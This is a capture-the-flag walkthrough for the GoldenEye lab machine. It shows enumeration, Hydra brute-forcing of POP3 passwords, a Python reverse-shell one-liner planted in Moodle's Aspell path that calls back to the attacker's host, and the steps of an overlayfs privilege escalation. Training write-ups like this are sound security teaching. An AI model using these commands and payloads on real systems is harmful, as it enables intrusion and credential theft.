# GoldenEye

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Medium
Tags: Linux, Web
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
Bond, James Bond. A guided CTF.
```

Room link: [https://tryhackme.com/room/goldeneye](https://tryhackme.com/room/goldeneye)

## Solution

### Task 1: Intro & Enumeration

This room will be a guided challenge to hack the James Bond styled box and get root.

Credit to [creosote](https://www.vulnhub.com/author/creosote,584/) for creating this VM. **This machine is used here with the explicit permission of the creator <3**

So.. Lets get started!

First things first, connect to our [network](https://tryhackme.com/access) and deploy the machine.

---------------------------------------------------------------------------------------

#### Use nmap to scan the network for all ports. How many ports are open?

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ sudo nmap -sV -sC -p- -v $TARGET_IP
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 14:18 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
Initiating Ping Scan at 14:18
Scanning 10.64.179.157 [4 ports]
Completed Ping Scan at 14:18, 0.14s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:18
Completed Parallel DNS resolution of 1 host. at 14:18, 0.01s elapsed
Initiating SYN Stealth Scan at 14:18
Scanning 10.64.179.157 [65535 ports]
Discovered open port 25/tcp on 10.64.179.157
Discovered open port 80/tcp on 10.64.179.157
SYN Stealth Scan Timing: About 18.11% done; ETC: 14:21 (0:02:20 remaining)
Discovered open port 55006/tcp on 10.64.179.157
Discovered open port 55007/tcp on 10.64.179.157
SYN Stealth Scan Timing: About 38.63% done; ETC: 14:21 (0:01:37 remaining)
SYN Stealth Scan Timing: About 57.25% done; ETC: 14:21 (0:01:08 remaining)
SYN Stealth Scan Timing: About 73.11% done; ETC: 14:21 (0:00:45 remaining)
Completed SYN Stealth Scan at 14:21, 174.62s elapsed (65535 total ports)
Initiating Service scan at 14:21
Scanning 4 services on 10.64.179.157
Completed Service scan at 14:22, 26.88s elapsed (4 services on 1 host)
NSE: Script scanning 10.64.179.157.
Initiating NSE at 14:22
Completed NSE at 14:22, 2.43s elapsed
Initiating NSE at 14:22
Completed NSE at 14:22, 2.01s elapsed
Initiating NSE at 14:22
Completed NSE at 14:22, 0.01s elapsed
Nmap scan report for 10.64.179.157
Host is up (0.12s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:22:34
| Not valid after:  2028-04-21T03:22:34
| MD5:   cd4a:d178:f216:17fb:21a6:0a16:8f46:c8c6
|_SHA-1: fda3:fc7b:6601:4746:96aa:0f56:b126:1c29:36e8:442c
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d039:2e71:c76a:2cb3:e694:ec40:7228:ec63
|_SHA-1: 9d6a:92eb:5f9f:e9ba:6cbd:dc93:55fa:5754:219b:0b77
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: UIDL RESP-CODES TOP PIPELINING SASL(PLAIN) CAPA USER AUTH-RESP-CODE
55007/tcp open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d039:2e71:c76a:2cb3:e694:ec40:7228:ec63
|_SHA-1: 9d6a:92eb:5f9f:e9ba:6cbd:dc93:55fa:5754:219b:0b77
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL(PLAIN) USER TOP PIPELINING CAPA STLS UIDL RESP-CODES AUTH-RESP-CODE

NSE: Script Post-scanning.
Initiating NSE at 14:22
Completed NSE at 14:22, 0.00s elapsed
Initiating NSE at 14:22
Completed NSE at 14:22, 0.00s elapsed
Initiating NSE at 14:22
Completed NSE at 14:22, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.68 seconds
           Raw packets sent: 67412 (2.966MB) | Rcvd: 67296 (2.692MB)
```

We have three main services running and available:

- Postfix smtpd running on port 25
- Apache httpd 2.4.7 running on port 80
- Dovecot pop3d running on port 55006 and 55007

Answer: `4`

#### Take a look on the website, take a dive into the source code too and remember to inspect all scripts

Manually browsing to `http://10.64.179.157/` shows the `Severnaya Auxiliary Control Station`

![GoldenEye Homepage](Images/GoldenEye_Homepage.png)

Checking the HTML-source of the homepage shows the presence of a `terminal.js` script

```html
<html>
<head>
<title>GoldenEye Primary Admin Server</title>
<link rel="stylesheet" href="index.css">
</head>

    <span id="GoldenEyeText" class="typeing"></span><span class='blinker'>&#32;</span>

<script src="terminal.js"></script>
    
</html>
```

#### Who needs to make sure they update their default password?

The `terminal.js` script contains

```javascript
var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}
```

so we we have a username (`boris`) and an encoded password

Answer: `Boris`

#### Whats their password?

We can decode the password with [Binary Refinery](https://github.com/binref/refinery/)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ source ~/Python_venvs/Binary_Refinery/bin/activate

┌──(Binary_Refinery)─(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ emit '&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;' | htmlesc       
InvincibleHack3r
```

#### Now go use those credentials and login to a part of the site

Logging in with `boris:InvincibleHack3r` on `http://10.64.179.157/sev-home/` we can access the GoldenEye project page

![GoldenEye Project Page](Images/GoldenEye_Project_Page.png)

The text reads

```text
GoldenEye is a Top Secret Soviet oribtal weapons project. 
Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO).
Please email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system.
Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port.
```

---------------------------------------------------------------------------------------

### Task 2: Its mail time

Onto the next steps..

---------------------------------------------------------------------------------------

#### Take a look at some of the other services you found using your nmap scan. Are the credentials you have re-usable?

Next, we can try to access the e-mails as boris via POP3

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ nc $TARGET_IP 55007
+OK GoldenEye POP3 Electronic-Mail System
USER Boris
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
quit
+OK Logging out
```

Nope, the default password wasn't valid there.

If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?

#### Whats their new password?

We try to bruteforce the password with `hydra`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ hydra -l boris -P /usr/share/wordlists/fasttrack.txt -t 64 -f pop3://$TARGET_IP:55007 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-08 15:08:01
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 262 login tries (l:1/p:262), ~5 tries per task
[DATA] attacking pop3://10.64.179.157:55007/
[55007][pop3] host: 10.64.179.157   login: boris   password: secret1!
[STATUS] attack finished for 10.64.179.157 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-08 15:08:35
```

Answer: `secret1!`

#### Inspect port 55007, what service is configured to use this port?

We saw this earlier in the `nmap` scan.

Answer: `pop3`

#### Login using that service and the credentials you found earlier

We can now login and enumerate Boris's emails

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ nc $TARGET_IP 55007                                                             
+OK GoldenEye POP3 Electronic-Mail System
USER Boris
+OK
PASS secret1!
+OK Logged in.
LIST
+OK 3 messages:
1 544
2 373
3 921
.
RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

.
QUIT
+OK Logging out.
```

#### What can you find on this service?

Answer: `emails`

#### What user can break Boris' codes?

From the second message above we can see that `natalya` can break Boris' codes.

Answer: `natalya`

#### Using the users you found on this service, find other users passwords

From the e-mails we can see two additional possible usernames:

- natalya
- xenia

Let's bruteforce the POP3 service for them also

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -t 64 -f pop3://$TARGET_IP:55007
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-08 15:22:39
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 64 tasks per 1 server, overall 64 tasks, 262 login tries (l:1/p:262), ~5 tries per task
[DATA] attacking pop3://10.64.179.157:55007/
[55007][pop3] host: 10.64.179.157   login: natalya   password: bird
[STATUS] attack finished for 10.64.179.157 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-08 15:23:03
                                                                                                                                                                                                             
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ hydra -l xenia -P /usr/share/wordlists/fasttrack.txt -t 64 -f pop3://$TARGET_IP:55007
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-08 15:23:26
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 64 tasks per 1 server, overall 64 tasks, 262 login tries (l:1/p:262), ~5 tries per task
[DATA] attacking pop3://10.64.179.157:55007/
[STATUS] 262.00 tries/min, 262 tries in 00:01h, 1 to do in 00:01h, 6 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-08 15:24:31
```

Next, we enumerate Natalya's e-mails

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ nc $TARGET_IP 55007                                                                    
+OK GoldenEye POP3 Electronic-Mail System
USER natalya
+OK
PASS bird
+OK Logged in.
LIST
+OK 2 messages:
1 631
2 1048
.
RETR 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.


.
QUIT
+OK Logging out.
```

We now have new credentials: `xenia:RCP90rulez!`

---------------------------------------------------------------------------------------

### Task 3: GoldenEye Operators Training

Enumeration really is key. Making notes and referring back to them can be lifesaving. We shall now go onto getting a user shell.

If you remembered in some of the emails you discovered, there is the severnaya-station.com website. To get this working, you need up update your DNS records to reveal it.

If you're on Linux edit your "/etc/hosts" file and add:

`<machines ip> severnaya-station.com`

If you're on Windows do the same but in the "c:\Windows\System32\Drivers\etc\hosts" file

---------------------------------------------------------------------------------------

Next, we update out `/etc/hosts` file

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ sudo vi /etc/hosts                                        

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ tail -n 1 /etc/hosts
10.64.179.157 severnaya-station.com
```

#### Once you have done that, in your browser navigate to: `http://severnaya-station.com/gnocertdir`

Then we can access `http://severnaya-station.com/gnocertdir` training site

![GoldenEye Training Page](Images/GoldenEye_Training_Page.png)

#### Try using the credentials you found earlier. Which user can you login as?

Clicking on the `Intro to GoldenEye` requires us to login.

We login with `xenia:RCP90rulez!`.

Answer: `xenia`

#### Have a poke around the site. What other user can you find?

There we find a welcome message from `Dr Doak` with a username of `doak`

![GoldenEye Training Page 2](Images/GoldenEye_Training_Page_2.png)

Answer: `doak`

#### What was this users password?

Why not try to bruteforce Doak's password as well?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ hydra -l doak -P /usr/share/wordlists/fasttrack.txt -t 64 -f pop3://$TARGET_IP:55007
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-08 15:44:51
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 64 tasks per 1 server, overall 64 tasks, 262 login tries (l:1/p:262), ~5 tries per task
[DATA] attacking pop3://10.64.179.157:55007/
[55007][pop3] host: 10.64.179.157   login: doak   password: goat
[STATUS] attack finished for 10.64.179.157 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-08 15:45:17
```

Answer: `goat`

#### What is the next user you can find from doak?

We enumerate Doak's emails as before

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ nc $TARGET_IP 55007                                                                 
+OK GoldenEye POP3 Electronic-Mail System
USER doak
+OK
PASS goat
+OK Logged in.
LIST
+OK 1 messages:
1 606
.
RETR 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

.
QUIT
+OK Logging out.
```

and find his credentials to the training site (`dr_doak:4England!`)

Answer: `dr_doak`

#### What is this users password?

Answer: `4England!`

#### Take a look at their files on the moodle (severnaya-station.com)

After some enumeration on the training site as Dr Doak we find a `s3cret.txt` file in his private files

![GoldenEye Training Page 3](Images/GoldenEye_Training_Page_3.png)

The file contains:

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ cat s3cret.txt           
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.   
```

We download the file with `wget`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ wget http://$TARGET_IP/dir007key/for-007.jpg                                               
--2026-02-08 15:55:50--  http://10.64.179.157/dir007key/for-007.jpg
Connecting to 10.64.179.157:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14896 (15K) [image/jpeg]
Saving to: ‘for-007.jpg’

for-007.jpg                                         100%[================================================================================================================>]  14.55K  --.-KB/s    in 0s      

2026-02-08 15:55:52 (232 MB/s) - ‘for-007.jpg’ saved [14896/14896]
```

#### Download the attachments and see if there are any hidden messages inside them?

Next, we do some analysis of the file

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ ls
for-007.jpg  s3cret.txt

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ file for-007.jpg 
for-007.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=7, description=eFdpbnRlcjE5OTV4IQ==, manufacturer=GoldenEye, resolutionunit=2, software=linux], baseline, precision 8, 313x212, components 3

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ exiftool for-007.jpg          
ExifTool Version Number         : 13.25
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2018:04:25 02:40:02+02:00
File Access Date/Time           : 2026:02:08 15:55:52+01:00
File Inode Change Date/Time     : 2018:04:25 02:40:02+02:00
File Permissions                : -rwxrwxrwx
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d                    
xWinter1995x!
```

#### Using the information you found in the last task, login with the newly found user

Here I was a bit unsure about the user name. Was it `james`? `007`? `Admin`?

Until I rechecked the message (`I was able to capture this apps adm1n cr3ds through clear txt.`)

The credentials are `admin:xWinter1995x!`

Logging in to the training site gives us a lot more functionality

![GoldenEye Training Page 4](Images/GoldenEye_Training_Page_4.png)

As this user has more site privileges, you are able to edit the moodles settings.

#### From here get a reverse shell using python and netcat. Take a look into Aspell, the spell checker plugin

The `Path to Aspell` can be found under `Site administration`-> `Server` -> `System paths`.

![GoldenEye Training Page 5](Images/GoldenEye_Training_Page_5.png)

But we can also search for all settings matching a keyword (such as `spell`) in the lower left

![GoldenEye Training Page 6](Images/GoldenEye_Training_Page_6.png)

We use the `Python #2` Linux template from [revshells.com](revshells.com)

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.144.77",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

and also set the `Spell engine` to `PSpellShell`.

Then we create a netcat listener to accept the reverse shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ nc -lvnp 12345     
listening on [any] 12345 ...

```

To trigger the reverse shell we create a new blog entry and spell check it.

![GoldenEye Training Page 7](Images/GoldenEye_Training_Page_7.png)

Back at the netcat listener we now have a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ nc -lvnp 12345     
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.64.179.157] 38248
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ pwd
pwd
/var/www/html/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ 
```

---------------------------------------------------------------------------------------

### Task 4: Privilege Escalation

Now that you have enumerated enough to get an administrative moodle login and gain a reverse shell, its time to priv esc.

Download the [linuxprivchecker](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123) to enumerate installed development tools.

To get the file onto the machine, you will need to wget your local machine as the VM will not be able to wget files on the internet. Follow the steps to get a file onto your VM:

- Download the linuxprivchecker file locally
- Navigate to the file on your file system
- Do: `python -m SimpleHTTPServer 1337` (leave this running)
- On the VM you can now do: `wget <your IP>:<post>/<file>.py`

Download and share the file

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ wget https://gist.githubusercontent.com/sh1n0b1/e2e1a5f63fbec3706123/raw/1bd5f119a7f1e2d4c9328d78686ae79b4e1642f7/linuxprivchecker.py
--2026-02-08 16:46:00--  https://gist.githubusercontent.com/sh1n0b1/e2e1a5f63fbec3706123/raw/1bd5f119a7f1e2d4c9328d78686ae79b4e1642f7/linuxprivchecker.py
Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 25304 (25K) [text/plain]
Saving to: ‘linuxprivchecker.py’

linuxprivchecker.py                                 100%[================================================================================================================>]  24.71K  --.-KB/s    in 0.02s   

2026-02-08 16:46:01 (1.40 MB/s) - ‘linuxprivchecker.py’ saved [25304/25304]


┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/GoldenEye]
└─$ python -m http.server   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

Then download it to the target machine

```bash
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ cd /tmp
cd /tmp
www-data@ubuntu:/tmp$ wget http://192.168.144.77:8000/linuxprivchecker.py
wget http://192.168.144.77:8000/linuxprivchecker.py
--2026-02-08 07:47:47--  http://192.168.144.77:8000/linuxprivchecker.py
Connecting to 192.168.144.77:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 25304 (25K) [text/x-python]
Saving to: 'linuxprivchecker.py'

100%[======================================>] 25,304      --.-K/s   in 0.1s    

2026-02-08 07:47:47 (221 KB/s) - 'linuxprivchecker.py' saved [25304/25304]

www-data@ubuntu:/tmp$ ls -l
ls -l
total 32
-rw-rw-rw- 1 www-data www-data 25304 Feb  8 07:46 linuxprivchecker.py
-rw------- 1 www-data www-data     8 Feb  8 07:37 tinyspell47Es4p
www-data@ubuntu:/tmp$ 
```

#### Whats the kernel version?

Next, we run it

```bash
www-data@ubuntu:/tmp$ python linuxprivchecker.py
python linuxprivchecker.py
=================================================================================================
LINUX PRIVILEGE ESCALATION CHECKER
=================================================================================================

[*] GETTING BASIC SYSTEM INFO...

[+] Kernel
    Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014

[+] Hostname
    ubuntu

[+] Operating System
    GoldenEye Systems **TOP SECRET**  \n \l

[*] GETTING NETWORKING INFO...

[+] Interfaces
    eth0      Link encap:Ethernet  HWaddr 0a:ff:f6:b5:99:27
    inet addr:10.64.179.157  Bcast:10.64.191.255  Mask:255.255.192.0
    inet6 addr: fe80::8ff:f6ff:feb5:9927/64 Scope:Link
    UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
    RX packets:192633 errors:0 dropped:0 overruns:0 frame:0
    TX packets:191132 errors:0 dropped:0 overruns:0 carrier:0
    collisions:0 txqueuelen:1000
    RX bytes:8960065 (8.9 MB)  TX bytes:13929520 (13.9 MB)
    lo        Link encap:Local Loopback
    inet addr:127.0.0.1  Mask:255.0.0.0
    inet6 addr: ::1/128 Scope:Host
    UP LOOPBACK RUNNING  MTU:65536  Metric:1
    RX packets:14667 errors:0 dropped:0 overruns:0 frame:0
    TX packets:14667 errors:0 dropped:0 overruns:0 carrier:0
    collisions:0 txqueuelen:0
    RX bytes:7473564 (7.4 MB)  TX bytes:7473564 (7.4 MB)
<---snip--->
```

Answer: `3.13.0-32-generic`

#### Vulnerability Analysis

This machine is vulnerable to the overlayfs exploit. The exploitation is technically very simple:

- Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.
- Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.
- Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.
- Make su on overlayfs world writable without changing the owner
- Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.
